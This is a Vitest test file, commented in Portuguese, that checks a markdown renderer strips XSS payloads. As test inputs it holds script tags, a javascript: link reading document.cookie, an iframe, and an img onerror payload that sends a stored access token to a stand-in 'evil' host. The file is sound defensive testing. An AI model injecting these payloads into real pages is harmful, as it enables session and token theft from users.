// @vitest-environment jsdom
// DOMPurify é testado contra o jsdom; sob o happy-dom padrão do projeto o
// sanitize vira no-op. Este arquivo roda em jsdom para exercitar a sanitização
// de verdade — no navegador real ela também funciona.
import { describe, it, expect } from "vitest";
import { renderMarkdown } from "../../lib/markdown";

describe("renderMarkdown — sanitização de XSS", () => {
  it("remove a tag <script> embutida no markdown", () => {
    const html = renderMarkdown("Olá <script>alert('xss')</script> mundo");
    expect(html).not.toContain("<script");
    expect(html).not.toContain("alert('xss')");
  });

  it("remove o handler onerror de uma <img> (o vetor de roubo de token)", () => {
    const payload = "![x](x) <img src=x onerror=\"fetch('//evil/'+localStorage.helphs_access_token)\">";
    const html = renderMarkdown(payload);
    expect(html.toLowerCase()).not.toContain("onerror");
    expect(html).not.toContain("localStorage");
  });

  it("neutraliza href com javascript:", () => {
    const html = renderMarkdown("[clique](javascript:alert(document.cookie))");
    expect(html.toLowerCase()).not.toContain("javascript:");
  });

  it("remove <iframe> injetado", () => {
    const html = renderMarkdown('texto <iframe src="//evil"></iframe>');
    expect(html.toLowerCase()).not.toContain("<iframe");
  });

  it("remove handlers de evento inline em qualquer elemento", () => {
    const html = renderMarkdown('<a href="#" onclick="alert(1)">link</a>');
    expect(html.toLowerCase()).not.toContain("onclick");
  });

  it("preserva a formatação legítima do markdown", () => {
    const html = renderMarkdown("## Título\n\n**negrito** e `código`\n\n- item");
    expect(html).toContain("<h2");
    expect(html).toContain("<strong>negrito</strong>");
    expect(html).toContain("<code>código</code>");
    expect(html).toContain("<li>item</li>");
  });

  it("preserva link legítimo com href http", () => {
    const html = renderMarkdown("[HS](https://healthsafetytech.com)");
    expect(html).toContain('href="https://healthsafetytech.com"');
  });
});
